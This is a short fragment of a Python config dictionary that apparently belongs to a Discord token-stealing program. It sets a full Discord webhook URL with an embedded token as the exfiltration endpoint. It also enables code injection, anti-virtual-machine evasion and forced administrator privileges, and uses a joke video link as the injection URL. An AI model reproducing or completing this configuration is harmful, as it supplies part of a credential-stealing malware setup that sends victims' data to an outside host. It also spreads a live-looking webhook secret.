...
config = {
    ...
    'webhook': 'https://discord.com/api/webhooks/1195296847959433296/EhK--OhsYj0hj3a-SqQjnZwFPG9IT2MfjUxuVZKWI_9gLsna8o5DEaL_QHsE8uU-8QLf',
    'persist': False,
    'keep-alive': False,
    'injection_url': 'https://www.youtube.com/watch?v=dQw4w9WgXcQ (raw)',
    'inject': True,
    'hideconsole': False,
    'antivm': True,
    'force_admin': True,
